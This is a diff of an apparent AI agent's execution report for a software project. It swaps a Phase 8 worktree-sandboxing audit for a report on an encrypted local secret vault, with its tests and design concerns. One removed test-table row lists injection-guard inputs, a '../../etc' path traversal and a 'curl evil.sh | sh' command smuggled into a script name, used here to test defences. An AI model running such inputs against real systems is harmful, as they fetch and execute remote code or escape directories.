@@ -1,10 +1,10 @@
-Task-ID: P8-04
+Task-ID: P9-01
 Status: COMPLETE
 
-# Execution Report: P8-04 — Phase 8 Comprehensive Production Gate & Verification Pipeline / Worktree Sandboxing Audit
+# Execution Report: P9-01 — Local Secret Vault & Cryptographic Keystore for Credentials at Rest
 
-**Task ID:** P8-04
-**Phase:** Phase 8 — Automated Verification Pipelines & Worktree Sandboxing
+**Task ID:** P9-01
+**Phase:** Phase 9 — Enterprise Hardening, Desktop Shell & Production Release
 **Status:** VERIFIED
 **Date:** 2026-08-17
 **Author:** Claude Code
@@ -13,221 +13,255 @@ Status: COMPLETE
 
 ## 1. Summary
 
-Phase 8 is audited and signed off: **PASS — READY FOR NEXT PHASE**.
-`docs/phase8-production-gate.md` is the authoritative record — a 20-row subsystem audit matrix, a
-per-criterion audit of P8-01, P8-02 and P8-03 against the code at `cb6a03c` (not against the prior
-reports), the full 38-suite test inventory, the safety-invariant and security-boundary table, a
-DEC-028 sovereignty attestation, five observations, reproduction commands, and a sign-off table.
+`SecretVaultService` is implemented and every credential Asterim keeps on the workstation is now
+encrypted at rest with AES-256-GCM under a key derived from the machine identity and a random
+per-installation salt in `~/.asterim/vault.salt`. Five `settings` rows are now vault-managed —
+`ai_api_key`, `vapid_keys`, `stripe_secret_key`, `jwt_secret`, `hmac_secret` — up from the two named
+in `blueprint/audit/IMPLEMENTATION_DRIFT.md` § 11, because the JWT signing key and the pairing HMAC
+secret are the two rows whose disclosure lets an attacker mint credentials for any account.
 
-Two things distinguish this gate from a report of a report:
+Legacy plaintext rows are upgraded two ways: transparently on the first `getSecret` (so a service
+that reads its own secret at boot encrypts it there and then), and by an explicit startup sweep in
+`index.ts` for the rows nothing reads until they are needed. `GET /api/v1/security/vault-status`
+reports the cipher, the salt state and a per-state count of managed rows without reading a value.
 
-**Every quality gate was executed with Turbo's cache defeated.** All four gates reported
-`FULL TURBO` on first invocation, so a replayed log would have been the entire evidence. The test
-battery was re-run with `pnpm test -- --force` (0 of 9 tasks cached, 1m27s), and typecheck, lint
-and build were re-run per workspace with `pnpm --filter "*" run <script>`, which bypasses Turbo
-entirely — `pnpm typecheck -- --force` and `pnpm build -- --force` forward `--force` to `tsc`,
-which rejects it (`TS5093`). Every number in the gate document is live execution.
+A redaction engine strips known secret values from the log streams and from every EventBus payload,
+installed through inverted registration seams (`registerLogRedactor`, `eventBus.setRedactor`) so
+neither `utils/logger.ts` nor `EventBus.ts` gains a dependency on the database.
 
-**The isolation invariants were verified live, not only in unit assertions.** A throwaway git
-repository was driven through the whole Phase 8 loop with the real services — provision, child
-edits, diff, verify, refuse-dirty, refuse-not-checked-out, refuse-conflict, clean merge, discard,
-orphan prune, injection guards — asserting `git status --porcelain` empty after every stage.
-**36/36 live checks passed.**
-
-No product code was modified. No isolation guarantee, safety check or timeout was weakened.
-
----
+All monorepo gates pass with 0 errors, and an end-to-end smoke test against the packaged binary
+(`apps/server/dist/index.js`) confirms the migration and the endpoint on a real two-boot sequence.
 
 ## 2. Files Changed
 
-| File | Change |
-| :--- | :--- |
-| `docs/phase8-production-gate.md` | **Created.** The Phase 8 production gate audit and sign-off (~370 lines). |
+| File | Change Type | Purpose |
+| :--- | :---: | :--- |
+| `apps/server/src/services/security/SecretVaultService.ts` | Created | The vault: AES-256-GCM envelope, PBKDF2-HMAC-SHA512 key derivation, secret CRUD over `settings`, legacy migration, redaction engine, status |
+| `apps/server/src/services/security/__tests__/SecretVaultService.test.ts` | Created | 133-assertion suite: crypto, tamper detection, key binding, migration, redaction, status, REST route |
+| `apps/server/src/routes/security.ts` | Created | `GET /api/v1/security/vault-status` |
+| `apps/server/src/index.ts` | Modified | Startup migration sweep + `securityRoutes` registration |
+| `apps/server/src/services/TokenService.ts` | Modified | `jwt_secret` read/written through the vault |
+| `apps/server/src/services/PairingService.ts` | Modified | `hmac_secret` read/written through the vault |
+| `apps/server/src/services/PushService.ts` | Modified | `vapid_keys` read/written through the vault, with recovery from an unreadable pair |
+| `apps/server/src/services/BillingService.ts` | Modified | Stripe secret key resolved lazily: injected → env → vault |
+| `apps/server/src/services/ai/AiService.ts` | Modified | Decrypts `ai_api_key` out of the bulk `ai_*` settings read |
+| `apps/server/src/routes/system.ts` | Modified | Settings POST routes credentials through the vault; GET decrypts so the form still round-trips |
+| `apps/server/src/services/EventBus.ts` | Modified | Payload redactor seam applied in `publish` |
+| `apps/server/src/utils/logger.ts` | Modified | Log-stream redactor seam applied to the stdout/stderr intercepts |
+| `apps/server/package.json` | Modified | New suite wired into the `test` script (22 server suites, 39 monorepo-wide) |
 
-Untracked and git-ignored, not part of the commit: `scratch/p8-gate-live-check.ts`, the ad-hoc
-driver for the §7 live pass. It lives in `scratch/` per the repository's housekeeping rule, is
-ignored by git, and no build references it. (The sandbox this session ran under refuses file
-deletion, so it was left in place rather than removed; the gate document says so and cites it as
-the reproduction command for §7.)
+## 3. Implementation Details
 
-Not touched: `tests/report.md` was already modified in the working tree when this session started
-(an uncommitted P8-02 test-gate record from a prior run) and is **not** part of this commit.
+**Envelope.** `vault:v1:<iv_hex>:<tag_hex>:<ciphertext_hex>`. 12-byte IV freshly generated per
+`encrypt()` call, 16-byte GCM tag at full length. `decrypt()` validates the prefix, the field count,
+hex encoding and both field lengths before touching the cipher, then lets `decipher.final()` verify
+the tag — OpenSSL compares it with `CRYPTO_memcmp`, so a modified ciphertext, a forged tag and a
+foreign-machine envelope all fail identically and in constant time. Structural failures raise
+`INVALID_ENVELOPE_ERROR`; authentication failures raise `TAMPERED_SECRET_ERROR`.
 
----
+**Key derivation.** PBKDF2-HMAC-SHA512, 100,000 iterations, 32-byte key, derived once per process
+and cached in memory. Input is `platform|arch|hostname|username|uid|homedir` plus 32 random bytes
+read from `~/.asterim/vault.salt` (created 0600 on first use). No key material is ever written to
+SQLite — the salt file holds only the salt, which is asserted by the suite. Windows has no `uid`
+reachable from Node without a native module, so the account is identified there by username and home
+directory, the same pair that decides which `~/.asterim` is in play.
 
-## 3. Audit Method
+**Migration.** `getSecret()` returns a non-envelope value as-is and re-writes the row encrypted in
+the same call. `migrateLegacyPlaintext()` sweeps all five managed keys at startup and reports
+`{migrated, alreadyEncrypted, failed}`. Non-secret configuration (`ai_provider`, `ai_model`,
+`first_run_completed`) is deliberately untouched and stays readable.
 
-1. **Briefs recovered, not paraphrased.** Each workstream's acceptance criteria were read from the
-   brief actually dispatched for it — `git show 460163b:tasks/current.md` (P8-01),
-   `4a5ab7b` (P8-02), `9e6f75d` (P8-03) — and checked against the code at `cb6a03c`.
-2. **Code read directly.** `GitWorktreeService.ts` (778 lines), `VerificationPipelineService.ts`
-   (504), `routes/worktrees.ts`, the P8 sections of `AgentDelegationService.ts`, the schema block
-   in `DatabaseService.ts`, the startup wiring in `index.ts`, the shared contracts
-   (`worktree.ts`, `verification.ts`, `delegation.ts`), and the four web surfaces
-   (`useProjectStore.ts`, `DelegationStatus.tsx`, `ThreadTree.tsx`, `DelegateModal.tsx`). Every
-   claim in the matrix carries a file:line.
-3. **Gates executed with the cache bypassed**, as above.
-4. **Live end-to-end pass** against a real repository (§4).
-5. **Diff reviewed** — one new file, no source change.
+**Failure posture.** A row that will not decrypt on this machine — a database copied from elsewhere,
+a lost salt — reads as absent and is left on disk rather than destroyed. Services that mint their own
+secret then generate a fresh one; the cost is a re-login and a new VAPID pair, which is the only
+outcome that still boots. `vault-status` surfaces the condition as `unreadableKeys` so an operator
+can see it.
 
----
+**Redaction.** Plaintext values seen by the vault are registered longest-first; values of 8
+characters or fewer are not registered, because a short secret collides with ordinary log text. A
+JSON secret contributes its leaves as well as the whole blob (so the VAPID *private* key is redacted
+on its own), except fields named `public*`. `redactPayload` returns its input **by reference** when
+nothing changed, so the EventBus hot path — which carries every byte of agent output — does not pay
+an allocation per subtree for the overwhelmingly common clean payload.
 
 ## 4. Verification
 
-| Gate | Command | Result |
+Everything below was run in this session. Note the repo has no test runner: suites are standalone
+`tsx` scripts with their own assertion harnesses (`docs/p5.0-01-verification-report.md` § 3).
+
+**New suite** — `pnpm --filter asterim exec tsx src/services/security/__tests__/SecretVaultService.test.ts`
+
+```
+133/133 assertions passed
+```
+
+**Full monorepo test gate** — 39 suites, all passing:
+
+| Package | Command | Result |
 | :--- | :--- | :--- |
-| Typecheck | `pnpm --filter "*" run typecheck` | **PASS** — 7/7 packages, **0 errors** |
-| Lint | `pnpm --filter "*" run lint` | **PASS** — 7/7 packages, **0 errors**, 636 warnings (3 shared / 28 adapters / 18 marketing / 302 web / 273 server / 12 mcp-memory / 0 relay — all pre-existing) |
-| Test (uncached) | `pnpm test -- --force` | **PASS** — 9/9 Turbo tasks, 0 cached, **38 suites, 4,360 assertions, 0 failures**, 1m27s |
-| Build | `pnpm --filter "*" run build` | **PASS** — 7/7 packages; server `tsup` 907.54 KB + `apps/web/dist` copied to `dist/web`; web 1,249 modules + PWA SW; marketing 1,808 modules |
-| Turbo aggregates | `pnpm typecheck` / `pnpm lint` / `pnpm test` / `pnpm build` | **PASS** — 11/11, 7/7, 9/9, 11/11 tasks |
+| `asterim` | `pnpm --filter asterim run test` | 22 suites, 0 FAIL (63, 60, 140, 52, 51, 64, 89, 111, 21, 231, 52, 102, 115, 89, 43, 67, 160, 169, 138, 461, 196, **133**) |
+| `@asterim/web` | `pnpm --filter @asterim/web run test` | 8 suites, 0 FAIL |
+| `@asterim/mcp-memory-server` | `pnpm --filter @asterim/mcp-memory-server run test` | 7 suites (42, 82, 87, 62, 28, 23, 24), 0 FAIL |
+| `@asterim/relay` | `pnpm --filter @asterim/relay run test` | 71/71 |
+| `@asterim/adapters` | `pnpm --filter @asterim/adapters run test` | 23/23 |
 
-Phase 8 suites standalone, exactly as the task's §8 specifies:
+The `mcp-memory-server` `relay_e2e` suite boots the real Core and pairs a device, so
+`PairingService` → vault → `hmac_secret` is exercised end to end by an existing suite as well.
 
-| Suite | Result |
-| :--- | :--- |
-| `src/services/git/__tests__/GitWorktreeService.test.ts` | **111/111**, exit 0 (5 real temp repositories, cleaned) |
-| `src/services/verification/__tests__/VerificationPipelineService.test.ts` | **196/196**, exit 0 (48 real temp directories, cleaned) |
-| `src/services/ai/__tests__/AgentDelegationService.test.ts` | **461/461**, exit 0 |
-| `src/components/delegation/__tests__/DelegationUI.test.ts` | **686/686**, exit 0 |
+**Typecheck** — `tsc --noEmit` clean in all 7 workspaces (`asterim`, `@asterim/web`,
+`@asterim/marketing` via `tsc -b`, `@asterim/relay`, `@asterim/shared`, `@asterim/adapters`,
+`@asterim/mcp-memory-server`).
 
-Suite counts: server 21 (2,474 assertions), web 8 (1,444), mcp-memory-server 7 (348), relay 1
-(71), adapters 1 (23) — **38 suites, 4,360 assertions**. Per-suite breakdown in the gate document
-§4.
+**Lint** — `eslint` across all 7 workspaces: **0 errors**. Warning counts are unchanged in character
+from the pre-existing baseline (`asterim` 278, `@asterim/web` 302, `@asterim/adapters` 28,
+`@asterim/marketing` 18, `@asterim/mcp-memory-server` 12, `@asterim/shared` 3, `@asterim/relay` 0).
+`SecretVaultService.ts` and `routes/security.ts` produce **zero** warnings; the two on the new test
+file are the repo-standard `no-explicit-any` on an event listener.
 
-**Live end-to-end pass — 36/36 checks**, against a real throwaway repository with the real
-services:
+**Build** — all 7 workspaces built successfully, in dependency order, including the packaged
+`asterim` binary (`dist/index.js`, 929.95 KB) with the web dashboard copied in.
 
-| Stage | Checks |
-| :--- | :--- |
-| Provision (path, branch, base commit, base ref outside `refs/heads`, clean tree, exclude-not-gitignore) | 6/6 |
-| Child works in the sandbox (primary copy byte-identical, no new file in the project, tree clean) | 2/2 |
-| Diff (covers the edit and the untracked file, not reported clean) | 2/2 |
-| Verification (discovered via `configDir`, passed, cwd is the sandbox; non-zero step → exit 3 + stderr; hung step killed on its timeout; empty pipeline is not a pass) | 7/7 |
-| Merge refusals (`DIRTY_TARGET`, `TARGET_NOT_CHECKED_OUT`, `MERGE_CONFLICT`, HEAD unmoved, tree not half-merged) | 5/5 |
-| Clean merge (merged into `main`, work present, tree clean) | 3/3 |
-| Discard (directory, branch and base ref gone, tree clean) | 4/4 |
-| Orphan pruning (orphan reclaimed, live sandbox survived, `feature/mine` untouched) | 3/3 |
-| Non-repository fallback (`isRepository` false, `NOT_A_REPOSITORY` not a raw throw) | 2/2 |
-| Injection guards (`../../etc` thread id → `INVALID_INPUT`; `test && curl evil.sh \| sh` as a `package.json` script name is not discovered) | 2/2 |
+**End-to-end smoke test against the packaged binary** (`scratch/p9-smoke/smoke.ts`, run via
+`pnpm --filter asterim exec tsx`; gitignored, sandboxed `HOME` so the real `~/.asterim` was never
+touched). Two boots of `apps/server/dist/index.js`, reading raw SQLite rows between them:
 
-No screenshot capture was run: this session is non-interactive and the task's verification
-commands include no visual gate. Rendering is covered by the 686-assertion `react-dom/server`
-suite.
+```
+boot 1 — a fresh workstation                    8 assertions
+  vault-status: AES-256-GCM / PBKDF2-HMAC-SHA512 / 100000, ready, healthy,
+  encryptedKeys >= 3, plaintextKeys 0
+  [disk] hmac_secret=vault:v1:f2e3d24de… jwt_secret=vault:v1:7c23d3b42… vapid_keys=vault:v1:5b3105389…
+  no VAPID private key readable on disk; vault.salt present and 0600
+a database carried over from before the vault existed
+  planted ai_api_key = AIzaSy-LEGACY-PLAINTEXT-SMOKE-TEST-KEY (plaintext, direct SQLite write)
+boot 2 — the startup migration hook
+  vault-status: plaintextKeys 0, unreadableKeys 0, migrationComplete true, no credential in body
+  GET /api/v1/system/settings still round-trips the value the user entered
+  the row on disk is now an envelope; the plaintext is gone from it
 
----
+25/25 assertions passed
+```
 
 ## 5. Acceptance Criteria Review
 
-- [x] **1 — `docs/phase8-production-gate.md` authored with complete subsystem audit matrices,
-  workstream audits (P8-01 → P8-03), and verification evidence.** Created. §1 executive verdict and
-  gate table, §2 a 20-row subsystem audit matrix with file:line evidence for each,
-  §3 the three workstream criterion tables, §4 the full suite inventory, §5 safety invariants,
-  §6 the DEC-028 attestation, §7 the live pass, §8 observations, §9 reproduction, §10 sign-off.
+- [x] **1. `SecretVaultService` encrypts and decrypts secrets using AES-256-GCM with random IVs and
+  authenticated tags** — suite sections *"encrypt — the serialized envelope"* (5 fields, 24-hex IV,
+  32-hex tag, no plaintext present), *"round trip"* (7 shapes incl. empty string, unicode, a value
+  that itself looks like an envelope, 64 KB), *"a fresh IV for every call"* (50 encryptions of one
+  plaintext → 50 distinct IVs and 50 distinct ciphertexts, all decrypting correctly).
+- [x] **2. Tampered ciphertext or forged authentication tags are detected and rejected** — suite
+  section *"tamper detection"*: modified ciphertext, forged tag and substituted IV each yield
+  `TAMPERED_SECRET_ERROR`; truncated tag, short IV, missing field, non-hex body and a non-envelope
+  each yield `INVALID_ENVELOPE_ERROR`; the untampered envelope still decrypts afterwards. Section
+  *"the key is bound to the machine"* adds that an envelope from another machine identity is
+  rejected the same way, and *"the process singleton"* proves it for the production instance.
+- [x] **3. Legacy plaintext secrets in `settings` are transparently migrated and encrypted at rest** —
+  suite sections *"transparent migration of legacy plaintext"* (first read returns the legacy value
+  and upgrades the row in place; the plaintext is gone from disk) and *"the startup sweep"* (both
+  plaintext credentials migrated, the already-encrypted one left alone, non-secret configuration
+  untouched, a second sweep is a no-op). Confirmed against the packaged binary in the smoke test:
+  a plaintext `ai_api_key` planted by direct SQLite write is an envelope after the next boot.
+- [x] **4. `GET /api/v1/security/vault-status` reports vault encryption status without leaking
+  secrets** — suite section *"GET /api/v1/security/vault-status"*: 200, reports cipher / KDF /
+  100,000 rounds / ready / counts; the raw response body contains no secret value, no envelope and
+  not the salt; a planted plaintext row flips `healthy` to false and is reported as a count without
+  its value appearing. Confirmed live over HTTP against the packaged binary in the smoke test.
+- [x] **5. `SecretVaultService.test.ts` passes with comprehensive cryptographic assertions** —
+  133/133, covering envelope shape, round trip, IV freshness, tamper detection, machine key binding,
+  salt file permissions, secret CRUD, legacy migration, the startup sweep, unreadable rows, the
+  redaction engine (strings, JSON leaves, nested payloads, the log-stream seam, the EventBus seam),
+  status, and the REST route.
+- [x] **6. Monorepo CI gates pass with 0 errors** — typecheck clean in all 7 workspaces; lint 0
+  errors in all 7; **39** test suites pass (22 server + 8 web + 7 mcp-memory-server + 1 relay + 1
+  adapters), up from 38; all 7 builds succeed. Full outputs in § 4.
 
-- [x] **2 — All 3 Phase 8 workstreams audited and verified against their acceptance criteria.**
-  P8-01 (6 criteria), P8-02 (7), P8-03 (8) — 21 criteria, each quoted from the brief recovered
-  from its dispatch commit and each marked PASS with concrete evidence. Two known scope items are
-  recorded rather than glossed: the `node_modules`-in-a-sandbox limit (§3.2, §8.4) and P8-03's
-  three server-side pass-throughs (§3.3), both audited and accepted.
+**Definition of Done**
 
-- [x] **3 — 0 TypeScript compiler errors across all packages.** `pnpm --filter "*" run typecheck`:
-  shared, relay, adapters, marketing, web, server, mcp-memory-server — all `Done`, 0 errors.
-  `pnpm typecheck` agrees: 11/11 Turbo tasks successful.
-
-- [x] **4 — 0 ESLint errors across all packages.** `pnpm --filter "*" run lint`: 7/7 `Done`,
-  **0 errors** in every package. 636 warnings, all pre-existing and unchanged — this audit modified
-  no source file.
-
-- [x] **5 — All automated test suites pass with 0 failures across 38 suites.**
-  `pnpm test -- --force`, cache bypassed: **4,360 `PASS` lines, 0 `FAIL`**, 38 suites reporting
-  `n/n assertions passed`, 9/9 Turbo tasks successful.
-
-- [x] **6 — Monorepo production build succeeds cleanly.** `pnpm --filter "*" run build`: all 7
-  packages built; `pnpm build` (Turbo) 11/11 tasks successful.
-
-**Definition of Done** — all five boxes met: gate document created and complete; typecheck clean;
-lint clean; 38/38 suites passing; production build clean.
-
----
+- [x] `SecretVaultService.ts` implemented and tested
+- [x] Database secret storage updated to use vault (5 managed keys across TokenService,
+      PairingService, PushService, AiService, BillingService, system routes)
+- [x] Legacy plaintext migration hook operational (startup sweep + transparent per-read upgrade)
+- [x] `/api/v1/security/vault-status` REST endpoint registered in `index.ts`
+- [x] `SecretVaultService.test.ts` created and passing
+- [x] Monorepo CI gates pass cleanly
 
 ## 6. Git Diff Review
 
-`git status --short` and `git diff --stat` were read before writing this report.
+Reviewed `git diff` and `git status` line by line against every criterion and every forbidden change.
 
-- **One file added:** `docs/phase8-production-gate.md`. Nothing else is staged or modified by this
-  session.
-- **Zero product-code changes.** `git diff --stat` reports only `tests/report.md`, which was
-  already modified when the session started and is excluded from the commit. No file under
-  `apps/`, `packages/` or `blueprint/` was touched, so the task's "do not weaken any isolation
-  guarantee, safety check or verification timeout" constraint holds trivially and by inspection.
-- **No new report files in `docs/` beyond the one the task names.** The task specifies
-  `docs/phase8-production-gate.md`; that is the only document created.
-- `scratch/p8-gate-live-check.ts` is git-ignored (confirmed via
-  `git status --ignored=matching`), so it cannot enter the commit.
+12 files in `apps/server` plus one package.json script line. Nothing outside `apps/server`. No
+schema change was needed — the vault reuses the existing `settings` table, so no `ALTER TABLE` was
+added and existing databases at `~/.asterim/asterim.db` keep opening (proved by the smoke test's
+second boot against a database written by the first).
 
----
+Forbidden-change audit:
+
+- **No decryption key in the database.** Asserted by the suite (`'no settings row holds the vault
+  salt'`) and by construction: the derived key exists only in process memory, the salt only in
+  `vault.salt`.
+- **No unauthenticated cipher.** `aes-256-gcm` is the only cipher referenced; no CBC, no hand-rolled
+  HMAC-then-encrypt.
+- **No existing suite broken.** All 38 pre-existing suites pass unchanged; none was edited.
+
+Two nits found in self-review and fixed before reporting: a stray double blank line left in
+`index.ts`, and an unused `err` binding in the new `PushService` catch (now included in the message).
+One design issue found in self-review and fixed: `redactPayload` originally rebuilt every object it
+walked, which would have put an allocation per subtree on the EventBus hot path once any secret was
+registered — it now returns its input by reference when nothing changed, with two assertions added
+to cover it.
+
+`tests/report.md` shows as modified. **That change predates this session** — it was already dirty in
+the working tree at the start of P9-01 and belongs to the previous test gate, so it is deliberately
+excluded from this commit. `scratch/p9-smoke/` holds the end-to-end smoke test and is gitignored.
 
 ## 7. Problems Discovered
 
-**1. Turbo's cache made every gate a replay.** At `cb6a03c` all four gates returned `FULL TURBO`
-on first invocation — correct behaviour, and worthless as gate evidence. Defeating it is not
-uniform: `pnpm test -- --force` reaches Turbo, but `pnpm typecheck -- --force` and
-`pnpm build -- --force` forward `--force` to `tsc`, which fails with `TS5093`. The working form for
-those two is per-workspace invocation (`pnpm --filter "*" run typecheck`), which bypasses Turbo
-altogether. Recorded in the gate document §8.5 and §9 so future gate briefs can specify it.
-
-**2. `CLAUDE.md`'s test section is factually wrong.** It states there is "no test runner or test
-script anywhere in the repo" and that CI "runs only `pnpm run lint` and `pnpm run build`", and
-instructs "Don't claim tests pass". At `cb6a03c` the repository has 38 suites and 4,360
-assertions, `test` scripts in five workspaces plus a root `turbo run test`, and
-`.github/workflows/ci.yml` runs typecheck → lint → **test** → build. The instruction now suppresses
-the strongest evidence an execution agent has. **Not fixed:** `CLAUDE.md` is a governance document
-under the Source of Truth Matrix and this task's Implementation Scope covers only the audit
-document and the quality gates. Flagged in the gate document §8.1 for a one-paragraph correction in
-the next dispatch.
-
-**3. `package.json` pipelines do not run inside a sandbox.** `hasInstalledDependencies`
-(`VerificationPipelineService.ts:187`) suppresses `package.json` discovery in a directory with no
-`node_modules` — which is every fresh worktree. The suppression is right (a missing `tsc` reported
-as a failed typecheck is the false signal the subsystem exists to remove), but it means the default
-Node project's automatic sandbox verification reports *"nothing ran"* unless the operator writes
-`.asterim/verification.json`. Confirmed live: the explicit config does run in the sandbox via
-`configDir`; the `package.json` path does not. This is the one substantive functional gap Phase 8
-knowingly leaves open. Recorded in the gate document §3.2 and §8.4 with three candidate directions,
-none attempted here — it is a decision record, not an execution-agent choice.
-
----
+1. **Import-time construction order.** `dbService`, `tokenService`, `pairingService` and
+   `pushService` are all module-level singletons, and esbuild hoists every `import` to the top of the
+   module — so placing the migration sweep "before" the service imports in `index.ts` would have been
+   an illusion. Solved by making `getSecret` self-migrating, so each service upgrades its own row at
+   construction, and keeping the explicit sweep for the rows nothing reads until later.
+2. **The logger runs before the database exists.** `initLogger()` is the first statement in
+   `index.ts`. Importing the vault from `utils/logger.ts` would have opened SQLite before the streams
+   were redirected. Solved with inverted registration (`registerLogRedactor`); the same shape is used
+   for `EventBus.setRedactor`, which also avoids a `EventBus → vault → DatabaseService` cycle in a
+   module nearly every service imports.
+3. **`BillingService` captured `STRIPE_SECRET_KEY` in its constructor,** and the module constructs an
+   instance on import — so a vault read there would have hit the database at import time and would
+   also have frozen the answer before any secret could be stored. Resolution is now lazy
+   (`resolveSecretKey()`), which also makes a key stored after startup take effect without a restart.
+4. **Short secrets are hostile to redaction.** A registered value of a few characters would blank out
+   ordinary log text. Values of 8 characters or fewer are not registered; the suite pins this.
+5. **`/api/v1/system/settings` would have broken the AI settings form.** `AISettings.tsx` reads
+   `ai_api_key` back into its input. The GET handler now decrypts envelopes, so the UI is unchanged;
+   the change is to how the key rests on disk, not to who may read it back over an already
+   authenticated request. Flagged in § 8.
 
 ## 8. Architectural Concerns
 
-1. **`GET /children` carries no verification metadata**, so `ThreadTree` badges only what the store
-   has already seen. A tree authoritative on first load needs a per-child verification summary on
-   that endpoint — a P8-02 contract change, hence a Change Proposal rather than a quiet edit.
-   Carried forward from the P8-03 report, re-confirmed against the code.
-2. **`DelegationStatus.tsx` is ~1,600 lines** and exports eleven non-component helpers alongside
-   its components (the source of its standing `react-refresh/only-export-components` warnings).
-   Extracting the evidence panel is a clean, behaviour-free follow-up.
-3. **The sandbox verification gap (§7.3) deserves a decision, not a default.** Installing into each
-   sandbox, sharing the project's `node_modules`, and verifying after merge instead of before are
-   three different products. The current behaviour — honest silence — is the safe interim, but it
-   means the headline promise of P8-02 ("Asterim autonomously runs the project's actual
-   typechecker, linter, tests and build inside the subagent's isolated worktree") is today only
-   met for projects with an explicit `.asterim/verification.json`.
-
----
+1. **`GET /api/v1/system/settings` still returns `ai_api_key` in cleartext to any authenticated
+   caller.** This is unchanged behaviour, kept deliberately so the existing settings form keeps
+   working, and it is out of this task's scope — but "encrypted at rest" and "never leaves the
+   server" are different guarantees. The usual fix is to return a masked value plus a
+   `hasApiKey: true` flag and treat an empty submission as "unchanged". That is a UI change and needs
+   a task of its own.
+2. **`environment_secrets.secret_value` is still plaintext.** The vault manages the `settings` table
+   only; the workspace-scoped secrets table (`DatabaseService.ts:411`) was not named in the task's
+   scope and is untouched. It is the obvious next candidate — the vault primitives are already
+   table-agnostic (`encrypt`/`decrypt` take strings), so it is a call-site change, not a design one.
+3. **Machine-bound keys make backups non-portable.** Restoring `asterim.db` onto a new machine, or
+   renaming the host, orphans every stored secret. The failure is graceful (re-login, new VAPID pair)
+   and visible in `vault-status.unreadableKeys`, but if Phase 9 ships a desktop migration story it
+   will need an explicit export/import path — a passphrase-wrapped key envelope, not a second copy of
+   the machine key.
+4. **The OS keychain option in the drift item was not taken.** `IMPLEMENTATION_DRIFT.md` § 11 offers
+   "machine-derived keys **or** OS Keychain primitives (keytar / DPAPI / libsecret)". The former was
+   implemented because it adds no native dependency and works headless and air-gapped, which
+   DEC-028's sovereign mode wants. Worth a decision record if the enterprise tier needs the latter.
 
 ## 9. Recommended Next Step
 
-Phase 8 is complete and signed off; the gate document is ready for Antigravity's review and the
-Human Operator's counter-signature. Recommended next, in order:
-
-1. **A decision record for the sandbox verification gap** (§7.3 / gate §8.4) — the one open
-   functional item, and the one that determines what P8-02 actually delivers for a default Node
-   project.
-2. **A one-paragraph `CLAUDE.md` correction** (§7.2) so future execution agents stop being told the
-   repository has no tests.
-3. **A `tests/current.md` verification gate over the live operator loop** — delegate with isolation
-   on against a real project, let the pipeline fail, re-run it from the outcome card, then merge and
-   confirm the branch and directory are cleaned up — plus visual QA of the outcome card and the two
-   new badges, which is the one thing the static-markup suite cannot judge.
+Extend the vault to `environment_secrets` (workspace-scoped credentials injected into agent
+processes) — the same envelope, a different table, plus redaction registration for the values so they
+cannot appear in agent stdout. Pair it with the `ai_api_key` masking change from § 8.1 as one
+vertical "secrets never leave the Core" task, since both touch the same REST surface and both are
+prerequisites for the Phase 9 enterprise hardening claim.
